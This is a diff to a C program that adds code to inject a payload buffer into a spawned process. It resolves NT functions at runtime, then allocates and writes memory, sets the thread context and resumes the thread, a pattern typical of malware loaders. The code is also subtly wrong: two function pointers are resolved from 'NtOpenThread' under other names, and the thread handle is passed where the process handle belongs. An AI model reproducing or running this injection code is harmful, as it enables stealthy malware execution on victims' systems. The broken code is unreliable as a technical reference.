@@ -163,6 +163,8 @@ int main(int argc, char** argv, char* envp) {
 	size_t ptr_NtGetContextThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
 	size_t ptr_NtAllocateVirtualMemory = (size_t)GetFuncAddr(kb,L"NtOpenThread");
 	size_t ptr_NtWriteVirtualMemory = (size_t)GetFuncAddr(kb,L"NtWriteVirtualMemory");
+	size_t ptr_NtSetContextThread = (size_t)GetFuncAddr(kb, L"NtSetContextThread");
+	size_t ptr_NtResumeThread = (size_t)GetFuncAddr(kb, L"NtResumeThread");
 
 
 
@@ -198,6 +200,7 @@ int main(int argc, char** argv, char* envp) {
 
 	//((BOOL(WINAPI*)(HANDLE))ptr_CloseHandle)(snap);
 
+
 	hProc = pi.hProcess;
 	hThread = pi.hThread;
 
@@ -208,10 +211,13 @@ int main(int argc, char** argv, char* envp) {
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtGetContextThread)(hThread, CTX);
 
-	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hProc, &baseAddress, n,n,n,n);
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hThread, &baseAddress, n,sizeof(buf),n,n);
 
-	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(hProc, &baseAddress, &buf, sizeof(buf), &n);
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(hThread, &baseAddress, &buf, sizeof(buf), &n);
 
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtSetContextThread)(hThread, CTX);
+
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PULONG))ptr_NtResumeThread)(hThread, NULL);
 
 
 
